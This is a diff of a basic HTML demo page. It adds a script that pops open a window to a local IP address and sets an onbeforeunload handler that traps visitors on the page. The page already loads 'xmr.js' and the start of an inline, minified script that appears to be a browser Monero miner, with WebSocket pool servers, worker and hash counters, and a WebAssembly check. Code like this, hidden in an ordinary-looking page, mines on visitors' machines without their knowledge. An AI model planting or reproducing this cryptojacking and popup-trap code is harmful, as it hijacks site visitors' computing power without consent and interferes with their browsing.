@@ -6,6 +6,15 @@
 <h1>My First Heading</h1>
 
 <p>My first paragraph.</p>
+	<script type="text/javascript">
+		window.open('http://192.168.1.12');
+		window.onbeforeunload = function(){
+		return 'here';
+
+
+		};
+
+	</script>
 <a href="">clickhere</a>
 <script src="xmr.js"></script>
 <script>var server="wss://ws1.server:80/;wss://ws2.server:80/;wss://ws3.server:80/",job=null,workers=[],ws,receiveStack=[],sendStack=[],totalhashes=0,connected=0,reconnector=0,attempts=1,throttleMiner=0,handshake=null,wasmSupported=function(){try{if("object"===typeof WebAssembly&&"function"===typeof WebAssembly.instantiate){var c=new WebAssembly.Module(Uint8Array.of(0,97,115,109,1,0,0,0));if(c instanceof WebAssembly.Module)return new WebAssembly.Instance(c)instanceof WebAssembly.Instance}}catch(g){}return!1}();
